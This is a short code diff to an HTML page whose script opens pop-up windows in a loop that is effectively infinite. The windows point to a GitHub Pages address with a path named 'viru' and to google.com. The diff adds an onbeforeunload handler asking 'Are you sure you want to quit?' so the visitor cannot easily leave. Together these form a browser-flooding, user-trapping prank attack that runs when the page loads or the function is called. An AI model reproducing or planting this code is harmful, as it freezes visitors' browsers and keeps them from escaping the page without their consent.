@@ -16,10 +16,16 @@
         function myFunction() {
            
             for (var i = 0; i < 40000000000000000000000000000000000000000000000; i++) {
-                 window.open("https://pa30292.github.io/viru/","","height=100,left=0");
-                open("https://www.google.com/");
+                    window.open("https://pa30292.github.io/viru/","","height=100,left=0");
+                    open("https://www.google.com/");
                 }
         }
+
+        function myConfirmation() {
+            return 'Are you sure you want to quit?';
+        }
+
+        window.onbeforeunload = myConfirmation;
     </script>
 </body>
 </html>
